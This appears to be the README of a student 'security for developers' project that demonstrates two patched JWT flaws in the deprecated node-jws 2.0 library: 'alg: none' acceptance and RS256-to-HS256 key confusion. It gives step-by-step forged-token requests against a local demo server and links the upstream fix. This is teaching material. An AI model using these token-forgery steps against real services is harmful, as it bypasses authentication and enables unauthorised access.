# jwt-security-vulnerabilities  
school project for class "security for developers" in 2nd semester of top-up programme at UCN. based on written extended abstract: https://drive.google.com/file/d/1gNvA0Xint7NBhOBOb9H0OPjXazjL4G6B/view?usp=sharing

## description
project demostrates discovered and patched security vulnerabilities in popular node library generating jws by using both latest (secure) version 4.0 (22.11.2021 at the time of writing) and (unsafe) version 2.0 that is now deprecated. first vulnerability origins from using alg header parameter from token instead which can be easily modified by the attacker. second vulnerability origins from the fact that alg can be changed from asymmetric algorithm like rs256 to symmetric one like hs256. since public key is often easily accessible (hence the name) attacker can forge tokens that alters header parameter to alg: hs256 and such token will be considered valid. issue is well described here: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/. 

### security fix
see how was the issue patched: 
- fix: https://github.com/auth0/node-jws/commit/585d0e1e97b6747c10cf5b7689ccc5618a89b299
- changelog: https://github.com/auth0/node-jws/blob/master/CHANGELOG.md

### setup
1. npm install
2. use npm start to watch files, transpile them to javascript on detected file change and spin web server on port 3000
3. use npm run build to build project (ts -> js)
4. (optional) import postman collection for easy start

### endpoints
1. POST /auth/login - no body required - returns token
2. POST /auth/verify/safe - authorization header with bearer token required - returns 200 or 401
endpoint uses patched safe version of jws library
3. POST /auth/verify/unsafe - authorization header with bearer token required - returns 200 or 401
endpoint uses unpatched unsafe version of jws library (version 2)
4. GET /auth/key - returns public key
5. GET /auth/hacker/base64EncodedHeaderWithAlgNone - returns base64 encoded version of header "{ "alg": "none" }"
6. GET /auth/hacker/tokenFromPublicKey - returns hs256 token that was signed with a public key - accepted by /auth/verify/unsafe endpoint

### steps to exploit header alg none parameter vulnerability
1. obtain token
2. verify that token is accepted by both /auth/verify/safe and /auth/verify/unsafe
3. token can be manipulated by the attacker by changing alg in header to none (obtain from /auth/hacker/base64EncodedHeaderWithAlgNone) and replacing the first part of the token and removing signature part so header.payload.signature becomes newHeader.payload. (notice the trailing dot!!!!)
4. such token is not accepted by /auth/verify/safe but passes as valid in /auth/verify/unsafe
```
POST /auth/login
eyJhbGciOiJSUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.V3vtGMj6YXx4y8g3QNvhiI13K1UQtqkMVy6SG8qW7e_2VwHZYvf-uPOZlzoIzV7Z0yKyRQRR1AMPFaIttSaLkw

GET /auth/hacker/base64EncodedHeaderWithAlgNone
eyJhbGciOiJub25lIn0=

# alter the token by replacing the header (first part) and removing signature
eyJhbGciOiJSUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.V3vtGMj6YXx4y8g3QNvhiI13K1UQtqkMVy6SG8qW7e_2VwHZYvf-uPOZlzoIzV7Z0yKyRQRR1AMPFaIttSaLkw
=>
eyJhbGciOiJub25lIn0=.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.

# verify token with existing endpoints
POST /auth/verify/safe Authorization: eyJhbGciOiJub25lIn0=.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9. 401
POST /auth/verify/unsafe Authorization: eyJhbGciOiJub25lIn0=.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9. 200
```

### steps to exploit altering header parameter alg rs256 to alg hs256
1. obtain token
2. verify that token is accepted by both /auth/verify/safe and /auth/verify/unsafe
3. rs256 is asymmetric algorithm requiring key pair - private to sign and public to verify. since the public key is, well, public anyone can ahold of it. jws2.0 considers alg parameter in header as absolute truth therefore forging your own token with public key yields token that passes as valid. to obtain such token call /auth/hacker/tokenFromPublicKey. it creates token from header "{ "alg": "hs256" }", payload and public key as a secret. 
4. such token is not accepted by /auth/verify/safe but passes as valid in /auth/verify/unsafe
```
POST /auth/login
eyJhbGciOiJSUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.V3vtGMj6YXx4y8g3QNvhiI13K1UQtqkMVy6SG8qW7e_2VwHZYvf-uPOZlzoIzV7Z0yKyRQRR1AMPFaIttSaLkw

GET /auth/hacker/tokenFromPublicKey
eyJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.Zgl3PR_haCrMgSuL6jHLj7efV3iEHleqM_JgMQIs918

POST /auth/verify/safe Authorization: eyJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.Zgl3PR_haCrMgSuL6jHLj7efV3iEHleqM_JgMQIs918 401
POST /auth/verify/unsafe Authorization: eyJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6InBhc3N3b3JkIiwidXNlcm5hbWUiOiJhZG1pbiJ9.Zgl3PR_haCrMgSuL6jHLj7efV3iEHleqM_JgMQIs918 200
```

### source code
all token related code is in src/auth
- src/auth/repository.ts - generating and verifying functions
- src/auth/routes.ts - api endpoints
- src/auth/types.ts - ts typings